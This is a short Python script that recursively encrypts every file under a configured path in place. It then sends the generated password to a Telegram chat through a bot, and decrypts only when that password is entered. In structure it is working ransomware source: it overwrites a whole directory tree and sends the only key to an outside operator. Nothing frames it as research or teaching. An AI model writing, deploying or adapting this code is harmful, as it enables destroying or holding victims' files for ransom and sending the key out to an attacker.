import io
import os
import telebot

from time import strftime, localtime
from dev.no_rugged import encryptStream, decryptStream, crypysh
from config import TOKEN, CHAT_ID, PATH



def send_pass(password):
    bot = telebot.TeleBot(TOKEN)
    bot.send_message(CHAT_ID, text=password)


def crypter(path, password, buffer_size, is_encrypted):
    sequence_bytes = io.BytesIO()

    with open(path, 'rb') as file:
        file_content = io.BytesIO(file.read())

    with open(path, 'wb') as file:
        if is_encrypted:
            encryptStream(
                file_content,
                sequence_bytes,
                password,
                buffer_size
            )
        else:
            decryptStream(
                file_content,
                sequence_bytes,
                password,
                buffer_size,
                len(file_content.getvalue())
            )
        file.write(sequence_bytes.getvalue())


def main():
    try:
        buffer_size = 64 * 1024

        # password generation
        password = crypysh()

        # read path from file
        # with open('../path.txt', encoding='utf-8') as file:
        #     data = file.readline()
        #     path = data[data.find(':') + 1:].strip().replace('\\', r'\\')

        path = PATH

        # reading a method from the command line
        method = int(input('[-] Enter method {1 - encrypt / 2 - decrypt}: '))

        # processing method
        if method == 1:
            method = True
            send_pass(f'{strftime("%d-%m-%Y|%H.%M.%S", localtime())}:\n{password}')
        elif method == 2:
            method = False
            password = input('[-] Enter pass: ')
        else:
            raise KeyError

        # encryption/decryption
        for root, dirs, files in os.walk(path):
            for file in files:
                if not file.startswith('.') and file != 'rugged.py' \
                        and file != 'no_rugged.py' and file != 'path.txt':
                    crypter(os.path.join(root, file), password, buffer_size, method)

        print('[+] Done!')
    except PermissionError:
        print('[!] File definition error')
    except SyntaxError:
        print('[!] Unicode error')
    except KeyError:
        print('[!] Method error')


if __name__ == '__main__':
    main()

